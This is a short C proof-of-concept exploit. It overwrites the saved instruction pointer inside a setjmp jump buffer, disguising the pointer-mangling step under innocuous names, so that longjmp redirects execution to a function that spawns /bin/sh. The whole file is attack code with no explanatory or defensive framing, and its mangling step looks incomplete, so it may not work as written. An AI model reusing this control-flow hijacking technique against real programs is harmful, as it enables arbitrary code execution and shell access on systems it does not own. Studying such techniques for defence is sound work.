#include <stdio.h>
#include <setjmp.h>
#include <stdint.h>
#include <limits.h>

#ifdef __i386__
   #define ITEMSPERSET 0x9
   #define OFFSET 0x14
#elif __x86_64__
   #define ITEMSPERSET 0x11
   #define OFFSET 0x38
#endif

unsigned long spacing(uintptr_t value) {
   return (value << ITEMSPERSET) | (value >> (__WORDSIZE - ITEMSPERSET));
}

int payload(){
   printf("[+] Crotz ...!!\n");
   system("/bin/sh");
}

int main(void){
   jmp_buf env;
   uintptr_t *p_retenv = (uintptr_t*) (((uintptr_t) env) + OFFSET);

   printf("[+] Crotz ...\n");
   if(setjmp(env) == 1){
      printf("[-] Failed ...\n");
      return 0;
   }

   *p_retenv = spacing((uintptr_t)payload);

   longjmp(env, 1);

   printf("[-] Failed ...\n");
   return 0;
}